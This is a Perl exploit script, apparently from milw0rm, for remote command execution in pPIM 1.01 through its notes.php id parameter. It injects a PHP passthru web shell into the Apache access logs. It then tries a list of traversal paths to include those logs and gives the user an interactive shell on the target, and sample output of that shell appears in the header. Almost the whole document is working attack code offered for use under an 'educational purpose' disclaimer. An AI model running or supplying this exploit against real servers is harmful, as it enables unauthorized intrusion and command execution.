<html><head><title>pPIM 1.01 (notes.php id) Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl
####################################################################
# pPIM 1.01 (notes.php id) Remote Command Execution Exploit
# url: http://www.phlatline.org/docs/files/ppim.zip
#
# Author: Jose Luis Gongora Fernandez (a.k.a) JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://www.hack0wn.com/
# team: Spanish Hackers Team - [SHT]
#
# thanks for the base code: CWH Underground
# but I changed many things and fix bugs.
#
# Hack0wn Security Project!!
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
####################################################################
# OUTPUT: (tested on localhost)
#
# Trying to Inject the Code...
# Successfully injected in ../../../../../../../var/log/apache2/access.log
#
# [shell]:~$ id
#  uid=33(www-data) gid=33(www-data) groups=33(www-data)
# [shell]:~$ uname -a
#  Linux h4x0rz 2.6.18-6-686 #1 SMP Sat Dec 27 09:31:05 UTC 2008 i686 GNU/Linux
# [shell]:~$ exit
# joss@h4x0rz:~/Desktop$


        use LWP::UserAgent;
	use IO::Socket;
	use LWP::Simple;

	
	@apache=(
        &quot;../../../../../../../apache/logs/error.log&quot;,
	&quot;../../../../../../../apache/logs/access.log&quot;,
	&quot;../../../../../../../apache/logs/error.log&quot;,
	&quot;../../../../../../../apache/logs/access.log&quot;,
	&quot;../../../../../../../apache/logs/error.log&quot;,
	&quot;../../../../../../../apache/logs/access.log&quot;,
	&quot;../../../../../../../etc/httpd/logs/acces_log&quot;,
	&quot;../../../../../../../etc/httpd/logs/acces.log&quot;,
	&quot;../../../../../../../etc/httpd/logs/error_log&quot;,
	&quot;../../../../../../../etc/httpd/logs/error.log&quot;,
	&quot;../../../../../../../var/www/logs/access_log&quot;,
	&quot;../../../../../../../var/www/logs/access.log&quot;,
	&quot;../../../../../../../usr/local/apache/logs/access_log&quot;,
	&quot;../../../../../../../usr/local/apache/logs/access.log&quot;,
	&quot;../../../../../../../var/log/apache/access_log&quot;,
	&quot;../../../../../../../var/log/apache2/access_log&quot;,
	&quot;../../../../../../../var/log/apache/access.log&quot;,
	&quot;../../../../../../../var/log/apache2/access.log&quot;,
	&quot;../../../../../../../var/log/access_log&quot;,
	&quot;../../../../../../../var/log/access.log&quot;,
	&quot;../../../../../../../var/www/logs/error_log&quot;,
	&quot;../../../../../../../var/www/logs/error.log&quot;,
	&quot;../../../../../../../usr/local/apache/logs/error_log&quot;,
	&quot;../../../../../../../usr/local/apache/logs/error.log&quot;,
	&quot;../../../../../../../var/log/apache/error_log&quot;,
	&quot;../../../../../../../var/log/apache2/error_log&quot;,
	&quot;../../../../../../../var/log/apache/error.log&quot;,
	&quot;../../../../../../../var/log/apache2/error.log&quot;,
	&quot;../../../../../../../var/log/error_log&quot;,
	&quot;../../../../../../../var/log/error.log&quot;,
	&quot;../../../../../var/log/access_log&quot;,
	&quot;../../../../../var/log/access_log&quot;
	);

	system(($^O eq 'MSWin32') ? 'cls' : 'clear');

        print &quot;#######################################################################\n&quot;;
        print &quot;# pPIM 1.01 (notes.php id) Remote Command Execution Exploit | By JosS #\n&quot;;
        print &quot;#######################################################################\n\n&quot;;


        if (!$ARGV[0])
           {
             print &quot;Usage: perl exploit.pl [host]\n&quot;;
             print &quot;       perl exploit.pl localhost\n\n&quot;;
        exit;}

	$host=$ARGV[0];
        $path=&quot;/notes.php?mode=edit&amp;id=&quot;; # change if it is necesary

	# if ( $host   =~   /^http:/ ) {$host =~ s/http:\/\///g;}
	
	print &quot;\nTrying to Inject the Code...\n&quot;;
	$CODE=&quot;&lt;? passthru(\$_GET[cmd]) ?&gt;&quot;;
	$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;Could not connect to host.\n\n&quot;;
	print $socket &quot;GET /images/&quot;.&quot;\#\#%\$\$%\#\#&quot;.$CODE.&quot;\#\#%\$\$%\#\#&quot; . &quot;HTTP/1.1&quot;;
	print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
	print $socket &quot;Connection: close\r\n\r\n&quot;;
	close($socket);
	
	 if ( $host   !~   /^http:/ ) {$host = &quot;http://&quot; . $host;}
	
	foreach $getlog(@apache)
                {
                  chomp($getlog);          
		  $find= $host.$path.$getlog; # $find= $host.$path.$getlog.&quot;%00&quot;;
                  $xpl = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
		  $req = HTTP::Request-&gt;new(GET =&gt; $find);
		  $res = $xpl-&gt;request($req);
		  $info = $res-&gt;content;
                  if($info =~ /\#\#\%\$\$\%\#\#/) # change if it is necesary
                  {print &quot;Successfully injected in $getlog \n\n&quot;;$log=$getlog; last;}
                }
	
	print &quot;[shell]:~\$ &quot;;
	chomp( $cmd = &lt;STDIN&gt; );
	
	while($cmd !~ &quot;exit&quot;) {   
			 $shell= $host.$path.$log.&quot;&amp;cmd=$cmd&quot;; # $shell= $host.$path.$log.&quot;%00&amp;cmd=$cmd&quot;;
			 $xpl = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
			 $req = HTTP::Request-&gt;new(GET =&gt; $shell);
			 $res = $xpl-&gt;request($req);
			 $info = $res-&gt;content; 
				 if ($info =~ /\#\#%\$\$%\#\#(.*?)\#\#%\$\$%\#\#/sg) 
				 {print $1;}
			 print &quot;[shell]:~\$ &quot;;
			 chomp( $cmd = &lt;STDIN&gt; ); 
	}

          
        # __h0__

# milw0rm.com [2009-02-23]</pre></html>